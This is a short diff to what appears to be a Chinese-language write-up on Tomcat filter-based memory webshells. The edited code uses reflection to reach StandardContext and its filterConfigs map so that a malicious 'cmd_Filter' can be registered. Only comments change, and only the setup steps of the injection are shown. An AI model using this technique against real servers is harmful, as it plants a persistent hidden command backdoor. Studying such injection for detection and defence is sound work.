@@ -271,11 +271,13 @@ ServletContext servletContext = request.getSession().getServletContext();//先�
  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
   
   
-  //反射把我们的恶意Filter包装好put进去
+  //拿到filterConfigs这个Map
  String FilterName = "cmd_Filter";  
  Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
  Configs.setAccessible(true);  
  filterConfigs = (Map) Configs.get(standardContext); 
+ 
+ //后面把恶意的Filter put到map中
 ```
 
 
